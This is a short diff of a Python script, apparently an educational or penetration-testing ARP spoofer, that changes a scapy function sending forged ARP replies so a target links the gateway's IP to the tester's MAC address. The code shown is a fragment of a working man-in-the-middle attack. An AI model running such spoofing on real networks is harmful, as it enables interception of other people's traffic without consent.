@@ -37,9 +37,8 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
     # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # tester mac address automatically inserted here
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip) # tester mac address automatically inserted here
     scapy.send(packet, verbose=False)
     
 def restore(dest_ip, source_ip):
